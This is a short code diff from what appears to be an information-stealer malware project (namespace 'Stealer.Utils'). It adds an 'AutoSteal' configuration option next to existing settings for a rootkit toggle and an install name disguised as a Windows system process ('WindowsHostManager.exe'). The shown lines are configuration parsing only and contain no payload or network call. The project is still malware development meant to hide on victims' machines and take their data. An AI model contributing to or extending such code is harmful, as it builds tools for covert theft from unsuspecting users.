@@ -18,6 +18,7 @@ namespace Stealer.Utils
         public static string InstallName   { get; private set; } = "WindowsHostManager.exe";
         public static bool DebugMode       { get; private set; } = false;
         public static bool RootkitEnabled  { get; private set; } = false;
+        public static string AutoSteal     { get; private set; } = "never";
         
         private static bool _initialized = false;
 
@@ -63,6 +64,7 @@ namespace Stealer.Utils
                         var rawName    = ParseJsonKey(json, "installName").Trim().TrimEnd('\0', ' ');
                         var rawDebug   = ParseJsonKey(json, "debugMode").Trim().TrimEnd('\0', ' ');
                         var rawRootkit = ParseJsonKey(json, "rootkitEnabled").Trim().TrimEnd('\0', ' ');
+                        AutoSteal      = ParseJsonKey(json, "autoSteal").Trim().TrimEnd('\0', ' ');
                         
                         if (!string.IsNullOrEmpty(rawFolder)) InstallFolder = rawFolder;
                         if (!string.IsNullOrEmpty(rawName))   InstallName   = rawName;
